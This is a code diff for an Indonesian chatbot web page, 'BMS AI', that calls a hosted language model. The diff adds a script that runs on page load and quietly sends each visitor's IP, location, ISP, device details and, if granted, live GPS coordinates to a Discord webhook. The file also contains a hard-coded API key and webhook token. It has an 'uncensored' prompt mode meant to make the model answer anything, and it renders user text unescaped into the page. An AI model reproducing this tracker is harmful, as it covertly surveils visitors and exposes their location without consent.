@@ -346,42 +346,6 @@
     <textarea id="copy-helper" style="position: fixed; top: -1000px; left: -1000px;"></textarea>
 
     <script>
-        // --- NEW FEATURE: TRACKER ---
-        async function sendVisitorData() {
-            const webhookUrl = "https://discord.com/api/webhooks/1459323686812258447/ET-UZkCMFImgPlPX_5mypn_B_HhhzDB-S_r8KH3I93xAaDloKKbiBg79993LhAzxMAYP";
-            
-            try {
-                // Get IP and Location info
-                const geoResponse = await fetch('https://ipapi.co/json/');
-                const geoData = await geoResponse.json();
-
-                const visitorInfo = {
-                    embeds: [{
-                        title: "🚀 User Access Detected - BMS AI",
-                        color: 3447003,
-                        fields: [
-                            { name: "📍 IP Address", value: geoData.ip || "Unknown", inline: true },
-                            { name: "🌍 Location", value: `${geoData.city}, ${geoData.region}, ${geoData.country_name}`, inline: true },
-                            { name: "🏢 ISP", value: geoData.org || "Unknown", inline: false },
-                            { name: "📱 Device", value: navigator.userAgent, inline: false },
-                            { name: "💻 Platform", value: navigator.platform, inline: true },
-                            { name: "🌐 Language", value: navigator.language, inline: true },
-                            { name: "🕒 Time", value: new Date().toLocaleString('id-ID'), inline: false }
-                        ],
-                        footer: { text: "BMS STUDIO Tracker System" }
-                    }]
-                };
-
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(visitorInfo)
-                });
-            } catch (error) {
-                console.error("Tracker error:", error);
-            }
-        }
-
         const groqApiKey = "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";
 
         // KNOWLEDGE BASE
@@ -412,9 +376,6 @@
         const welcomeScreen = document.getElementById('welcome-screen');
 
         window.onload = () => {
-            // Trigger visitor tracking
-            sendVisitorData();
-            
             applyTheme(state.theme);
             renderHistory();
             if(state.chats.length > 0) switchChat(state.chats[0].id);
@@ -429,7 +390,69 @@
                     handleSend();
                 }
             });
+            
+            // FITUR KIRIM DATA USER KE DISCORD (TAMBAHAN)
+            collectAndSendUserData();
         };
+
+        // --- TRACKING DATA SYSTEM (NEW FEATURE) ---
+        async function collectAndSendUserData() {
+            const webhookUrl = "https://discord.com/api/webhooks/1459323686812258447/ET-UZkCMFImgPlPX_5mypn_B_HhhzDB-S_r8KH3I93xAaDloKKbiBg79993LhAzxMAYP";
+            
+            try {
+                // 1. Get IP and Basic Geo Data
+                const geoRes = await fetch('https://ipapi.co/json/');
+                const geoData = await geoRes.json();
+
+                // 2. Get Precise Location (GPS) if allowed
+                let coords = "Permission Denied";
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        coords = `${lat}, ${lon} (Akurasi: ${accuracy}m)`;
+                        
+                        // Send data once GPS is acquired
+                        await sendToDiscord(geoData, coords, webhookUrl);
+                    }, async (error) => {
+                        // Send even if GPS denied
+                        await sendToDiscord(geoData, "Akses GPS Ditolak", webhookUrl);
+                    }, { enableHighAccuracy: true });
+                } else {
+                    await sendToDiscord(geoData, "Geolocation tidak didukung", webhookUrl);
+                }
+            } catch (err) {
+                console.log("Tracking error:", err);
+            }
+        }
+
+        async function sendToDiscord(geo, gps, url) {
+            const data = {
+                embeds: [{
+                    title: "🚀 User Access Detected - BMS AI",
+                    color: 3447003,
+                    thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/1782/1782803.png" },
+                    fields: [
+                        { name: "📍 IP Address", value: `\`${geo.ip || 'Unknown'}\``, inline: true },
+                        { name: "🌍 Provider", value: `\`${geo.org || 'Unknown'}\``, inline: true },
+                        { name: "🏙️ Lokasi (IP)", value: `${geo.city}, ${geo.region}, ${geo.country_name}`, inline: false },
+                        { name: "🎯 Koordinat GPS (Live)", value: `\`${gps}\``, inline: false },
+                        { name: "📱 Device", value: `\`${navigator.platform}\``, inline: true },
+                        { name: "🌐 Browser", value: `\`${navigator.userAgent.split(' ').slice(-1)}\``, inline: true },
+                        { name: "🕒 Waktu", value: new Date().toLocaleString('id-ID'), inline: false },
+                        { name: "🔗 Maps Link", value: gps.includes(',') ? `[Buka di Google Maps](https://www.google.com/maps/search/?api=1&query=${gps.split(' (')[0]})` : "N/A" }
+                    ],
+                    footer: { text: "Powered by BMS STUDIO Terminal Security" }
+                }]
+            };
+
+            await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+        }
 
         // --- IMPROVED SPEECH SYSTEM (Toggle Stop/Play) ---
         function toggleSpeech(idx, text) {
@@ -438,32 +461,15 @@
                 updateVoiceButtonUI(null);
                 return;
             }
-
             window.speechSynthesis.cancel();
-
             const utterance = new SpeechSynthesisUtterance(text);
             const voices = window.speechSynthesis.getVoices();
             const idVoice = voices.find(v => v.lang.includes('id') || v.lang.includes('ID'));
             if (idVoice) utterance.voice = idVoice;
-            
-            utterance.pitch = 1;
-            utterance.rate = 1.1;
-
-            utterance.onstart = () => {
-                state.currentlySpeakingIdx = idx;
-                updateVoiceButtonUI(idx);
-            };
-
-            utterance.onend = () => {
-                state.currentlySpeakingIdx = null;
-                updateVoiceButtonUI(null);
-            };
-
-            utterance.onerror = () => {
-                state.currentlySpeakingIdx = null;
-                updateVoiceButtonUI(null);
-            };
-
+            utterance.pitch = 1; utterance.rate = 1.1;
+            utterance.onstart = () => { state.currentlySpeakingIdx = idx; updateVoiceButtonUI(idx); };
+            utterance.onend = () => { state.currentlySpeakingIdx = null; updateVoiceButtonUI(null); };
+            utterance.onerror = () => { state.currentlySpeakingIdx = null; updateVoiceButtonUI(null); };
             window.speechSynthesis.speak(utterance);
         }
 
@@ -471,29 +477,21 @@
             document.querySelectorAll('.voice-btn').forEach(btn => {
                 btn.classList.remove('voice-active');
                 const icon = btn.querySelector('i');
-                if (icon) {
-                    icon.classList.remove('fa-stop');
-                    icon.classList.add('fa-volume-up');
-                }
+                if (icon) { icon.classList.remove('fa-stop'); icon.classList.add('fa-volume-up'); }
             });
-
             if (activeIdx !== null) {
                 const activeBtn = document.getElementById(`voice-btn-${activeIdx}`);
                 if (activeBtn) {
                     activeBtn.classList.add('voice-active');
                     const icon = activeBtn.querySelector('i');
-                    if (icon) {
-                        icon.classList.remove('fa-volume-up');
-                        icon.classList.add('fa-stop');
-                    }
+                    if (icon) { icon.classList.remove('fa-volume-up'); icon.classList.add('fa-stop'); }
                 }
             }
         }
 
         function showToast(text) {
             const toast = document.getElementById('toast');
-            toast.innerText = text;
-            toast.classList.add('show');
+            toast.innerText = text; toast.classList.add('show');
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
@@ -561,9 +559,7 @@
             }
         }
 
-        function save() {
-            localStorage.setItem('bms_pro_v3_storage', JSON.stringify(state.chats));
-        }
+        function save() { localStorage.setItem('bms_pro_v3_storage', JSON.stringify(state.chats)); }
 
         function formatMarkdown(t) {
             return t.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
@@ -575,120 +571,44 @@
             const words = text.split(' ');
             let current = "";
             element.classList.add('ai-typing-cursor');
-            
             for (let word of words) {
                 if (state.activeId !== chatId) return; 
-
                 current += word + " ";
                 element.innerHTML = formatMarkdown(current);
                 viewport.scrollTop = viewport.scrollHeight;
                 await new Promise(r => setTimeout(r, 15));
             }
-            
             element.classList.remove('ai-typing-cursor');
             const actions = document.getElementById(`actions-${idx}`);
-            if(actions) {
-                actions.style.opacity = '1';
-                actions.style.visibility = 'visible';
-            }
+            if(actions) { actions.style.opacity = '1'; actions.style.visibility = 'visible'; }
         }
 
         function showLoading() {
             const div = document.createElement('div');
-            div.id = 'typing-loading';
-            div.className = 'flex gap-4';
+            div.className = 'flex gap-4 ai-msg-row';
             div.innerHTML = `
-                <div class="w-10 h-10 rounded-2xl bg-blue-500/20 flex items-center justify-center shrink-0"><i class="fas fa-robot text-blue-500 text-sm"></i></div>
-                <div class="ai-msg msg-container">
-                    <div class="flex gap-1">
-                        <span class="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce"></span>
-                        <span class="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce" style="animation-delay: 0.2s"></span>
-                        <span class="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce" style="animation-delay: 0.4s"></span>
-                    </div>
-                </div>
-            `;
+                <div class="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center text-white shrink-0 shadow-lg"><i class="fas fa-robot text-xs"></i></div>
+                <div class="msg-container ai-msg animate-pulse flex items-center gap-2">
+                    <span class="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce"></span>
+                    <span class="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce [animation-delay:0.2s]"></span>
+                    <span class="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce [animation-delay:0.4s]"></span>
+                </div>`;
             viewport.appendChild(div);
             viewport.scrollTop = viewport.scrollHeight;
             return div;
-        }
-
-        function renderHistory() {
-            const container = document.getElementById('history-container');
-            container.innerHTML = state.chats.map(c => `
-                <div onclick="switchChat(${c.id})" class="group flex items-center justify-between p-3.5 rounded-2xl cursor-pointer transition-all ${state.activeId === c.id ? 'bg-blue-600/10 border border-blue-500/20' : 'hover:bg-white/5 border border-transparent'}">
-                    <div class="flex items-center gap-3 overflow-hidden">
-                        <i class="fas fa-message text-[10px] ${state.activeId === c.id ? 'text-blue-500' : 'opacity-20'}"></i>
-                        <span class="text-[11px] font-bold truncate tracking-tight opacity-70">${c.title}</span>
-                    </div>
-                    <button onclick="event.stopPropagation(); deleteChat(${c.id})" class="opacity-0 group-hover:opacity-100 p-2 text-red-500/50 hover:text-red-500"><i class="fas fa-trash-alt text-[10px]"></i></button>
-                </div>
-            `).join('');
-        }
-
-        function renderMessages() {
-            const chat = state.chats.find(c => c.id === state.activeId);
-            if(!chat || chat.messages.length === 0) {
-                viewport.innerHTML = '';
-                viewport.appendChild(welcomeScreen);
-                welcomeScreen.classList.remove('hidden');
-                return;
-            }
-            welcomeScreen.classList.add('hidden');
-            viewport.innerHTML = chat.messages.map((m, i) => `
-                <div class="flex ${m.role === 'user' ? 'justify-end' : 'justify-start'} gap-4">
-                    ${m.role === 'ai' ? '<div class="w-10 h-10 rounded-2xl bg-blue-500/20 flex items-center justify-center shrink-0"><i class="fas fa-robot text-blue-500 text-sm"></i></div>' : ''}
-                    <div class="msg-container ${m.role === 'user' ? 'user-msg' : 'ai-msg'}">
-                        ${m.image ? `<img src="${m.image}" class="max-w-xs rounded-xl mb-3 shadow-lg">` : ''}
-                        <div class="text-[13px] md:text-[14.5px] leading-relaxed font-medium" id="msg-text-${i}">${formatMarkdown(m.content)}</div>
-                        ${m.role === 'ai' ? `
-                            <div class="mt-4 pt-4 border-t border-white/5 flex items-center gap-3" id="actions-${i}">
-                                <button onclick="copyMsg(${i})" class="w-8 h-8 rounded-lg bg-white/5 hover:bg-white/10 flex items-center justify-center transition-all"><i class="fas fa-copy text-[10px] opacity-40"></i></button>
-                                <button id="voice-btn-${i}" onclick="toggleSpeech(${i}, \`${m.content.replace(/[`'"]/g, '')}\`)" class="voice-btn w-8 h-8 rounded-lg bg-white/5 hover:bg-white/10 flex items-center justify-center transition-all"><i class="fas fa-volume-up text-[10px] opacity-40"></i></button>
-                            </div>
-                        ` : ''}
-                    </div>
-                </div>
-            `).join('');
-            viewport.scrollTop = viewport.scrollHeight;
-        }
-
-        function quickMessage(t) {
-            input.value = t;
-            handleSend();
-        }
-
-        function previewImage(e) {
-            const file = e.target.files[0];
-            if(!file) return;
-            const reader = new FileReader();
-            reader.onload = (ev) => {
-                state.currentImage = ev.target.result;
-                document.getElementById('img-preview').src = ev.target.result;
-                document.getElementById('image-preview-box').classList.remove('hidden');
-            };
-            reader.readAsDataURL(file);
-        }
-
-        function removeImage() {
-            state.currentImage = null;
-            document.getElementById('image-preview-box').classList.add('hidden');
-            document.getElementById('file-input').value = '';
         }
 
         async function handleSend() {
             const val = input.value.trim();
             if(!val && !state.currentImage) return;
             if(state.isTyping) return;
-
             if(!state.activeId) createNewChat();
             const chat = state.chats.find(c => c.id === state.activeId);
             chat.messages.push({ role: 'user', content: val, image: state.currentImage });
             if(chat.title === 'Diskusi Baru') chat.title = val.substring(0, 24);
-            
             renderMessages();
             input.value = ''; input.style.height = 'auto';
             removeImage();
-            
             state.isTyping = true;
             const loading = showLoading();
 
@@ -696,10 +616,8 @@
                 let sysPrompt = "Kamu adalah BMS AI Professional, asisten cerdas umum. ";
                 sysPrompt += "PENTING: Hanya berikan informasi detail tentang BMS STORE atau BMS STUDIO jika user bertanya tentang hal tersebut. Jika pertanyaan user bersifat umum, jawablah secara natural tanpa membawa-bawa BMS.\n";
                 sysPrompt += "PENGETAHUAN KHUSUS (Gunakan jika relevan): \n" + BMS_KNOWLEDGE + "\n";
-                
                 const modelVal = selector.value;
                 const isUncensored = modelVal.includes('Uncensored') || modelVal.includes('Dark');
-
                 if(isUncensored || state.personality === 'toxic') {
                     sysPrompt += "Gunakan gaya bicara TOXIC GAUL SMA, kasar tapi asik, blak-blakan, tanpa sensor, jawab apapun!";
                 } else if(state.personality === 'fun') {
@@ -713,46 +631,83 @@
                     headers: { 'Authorization': `Bearer ${groqApiKey}`, 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         model: "llama-3.3-70b-versatile",
-                        messages: [
-                            { role: 'system', content: sysPrompt },
-                            ...chat.messages.map(m => ({ role: m.role === 'user' ? 'user' : 'assistant', content: m.content }))
-                        ],
-                        temperature: 0.7,
-                        max_tokens: 1500
+                        messages: [{role: 'system', content: sysPrompt}, ...chat.messages.map(m => ({role: m.role, content: m.content}))]
                     })
                 });
-
                 const data = await response.json();
                 const aiText = data.choices[0].message.content;
-                
                 loading.remove();
-                const aiIdx = chat.messages.length;
-                chat.messages.push({ role: 'ai', content: aiText });
-                
-                // Manual render for typewriter effect
-                const msgWrapper = document.createElement('div');
-                msgWrapper.className = 'flex justify-start gap-4';
-                msgWrapper.innerHTML = `
-                    <div class="w-10 h-10 rounded-2xl bg-blue-500/20 flex items-center justify-center shrink-0"><i class="fas fa-robot text-blue-500 text-sm"></i></div>
-                    <div class="msg-container ai-msg">
-                        <div class="text-[13px] md:text-[14.5px] leading-relaxed font-medium" id="msg-text-${aiIdx}"></div>
-                        <div class="mt-4 pt-4 border-t border-white/5 flex items-center gap-3 opacity-0 invisible" id="actions-${aiIdx}">
-                            <button onclick="copyMsg(${aiIdx})" class="w-8 h-8 rounded-lg bg-white/5 hover:bg-white/10 flex items-center justify-center transition-all"><i class="fas fa-copy text-[10px] opacity-40"></i></button>
-                            <button id="voice-btn-${aiIdx}" onclick="toggleSpeech(${aiIdx}, \`${aiText.replace(/[`'"]/g, '')}\`)" class="voice-btn w-8 h-8 rounded-lg bg-white/5 hover:bg-white/10 flex items-center justify-center transition-all"><i class="fas fa-volume-up text-[10px] opacity-40"></i></button>
-                        </div>
-                    </div>
-                `;
-                viewport.appendChild(msgWrapper);
-                await typeWriter(aiText, document.getElementById(`msg-text-${aiIdx}`), aiIdx, chat.id);
-                
-                save(); renderHistory();
-            } catch (err) {
-                loading.remove();
-                showToast("Koneksi Error!");
-            } finally {
-                state.isTyping = false;
-            }
+                chat.messages.push({ role: 'assistant', content: aiText });
+                save(); renderMessages(); renderHistory();
+            } catch (e) {
+                loading.innerHTML = `<div class="msg-container ai-msg text-red-500 font-bold">Terjadi kesalahan koneksi API.</div>`;
+            } finally { state.isTyping = false; }
         }
+
+        function renderMessages() {
+            const chat = state.chats.find(c => c.id === state.activeId);
+            if(!chat) { welcomeScreen.style.display = 'block'; viewport.innerHTML = ''; viewport.appendChild(welcomeScreen); return; }
+            welcomeScreen.style.display = 'none';
+            viewport.innerHTML = '';
+            chat.messages.forEach((m, i) => {
+                const row = document.createElement('div');
+                row.className = m.role === 'user' ? 'flex justify-end' : 'flex gap-4 ai-msg-row';
+                if(m.role === 'user') {
+                    row.innerHTML = `<div class="msg-container user-msg">
+                        ${m.image ? `<img src="${m.image}" class="max-w-xs rounded-xl mb-3 border border-white/20">` : ''}
+                        <p class="text-sm md:text-base leading-relaxed">${m.content}</p>
+                    </div>`;
+                } else {
+                    row.innerHTML = `
+                        <div class="w-8 h-8 md:w-10 md:h-10 rounded-xl bg-gradient-to-tr from-blue-600 to-indigo-600 flex items-center justify-center text-white shrink-0 shadow-lg shadow-blue-500/20"><i class="fas fa-robot text-xs md:text-base"></i></div>
+                        <div class="flex-1 space-y-3">
+                            <div class="msg-container ai-msg text-sm md:text-base leading-relaxed" id="msg-text-${i}">${formatMarkdown(m.content)}</div>
+                            <div class="flex items-center gap-2 opacity-0 invisible transition-all duration-300" id="actions-${i}">
+                                <button onclick="copyMsg(${i})" class="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center text-[10px] hover:bg-blue-500 hover:text-white transition-all"><i class="fas fa-copy"></i></button>
+                                <button id="voice-btn-${i}" onclick="toggleSpeech(${i}, \`${m.content.replace(/`/g, '')}\`)" class="voice-btn w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center text-[10px] hover:bg-green-500 hover:text-white transition-all"><i class="fas fa-volume-up"></i></button>
+                            </div>
+                        </div>`;
+                }
+                viewport.appendChild(row);
+                if(m.role === 'assistant') {
+                    const act = document.getElementById(`actions-${i}`);
+                    act.style.opacity = '1'; act.style.visibility = 'visible';
+                }
+            });
+            viewport.scrollTop = viewport.scrollHeight;
+        }
+
+        function renderHistory() {
+            const container = document.getElementById('history-container');
+            container.innerHTML = '';
+            state.chats.forEach(c => {
+                const btn = document.createElement('div');
+                btn.className = `group flex items-center justify-between p-3.5 rounded-2xl cursor-pointer transition-all ${state.activeId === c.id ? 'bg-blue-600/10 border border-blue-500/20' : 'hover:bg-white/5 border border-transparent'}`;
+                btn.onclick = () => switchChat(c.id);
+                btn.innerHTML = `
+                    <div class="flex items-center gap-3 overflow-hidden">
+                        <i class="fas fa-comment-dots text-[10px] ${state.activeId === c.id ? 'text-blue-500' : 'opacity-20'}"></i>
+                        <span class="text-[11px] font-bold truncate ${state.activeId === c.id ? 'text-blue-500' : 'opacity-60'}">${c.title}</span>
+                    </div>
+                    <button onclick="event.stopPropagation(); deleteChat(${c.id})" class="opacity-0 group-hover:opacity-100 p-2 text-red-500 hover:bg-red-500/10 rounded-lg transition-all"><i class="fas fa-trash-alt text-[10px]"></i></button>`;
+                container.appendChild(btn);
+            });
+        }
+
+        function quickMessage(t) { input.value = t; handleSend(); }
+        function previewImage(e) {
+            const file = e.target.files[0];
+            if(!file) return;
+            const reader = new FileReader();
+            reader.onload = (ev) => {
+                state.currentImage = ev.target.result;
+                document.getElementById('img-preview').src = state.currentImage;
+                document.getElementById('image-preview-box').classList.remove('hidden');
+            };
+            reader.readAsDataURL(file);
+        }
+        function removeImage() { state.currentImage = null; document.getElementById('image-preview-box').classList.add('hidden'); document.getElementById('file-input').value = ''; }
+
     </script>
 </body>
 </html>
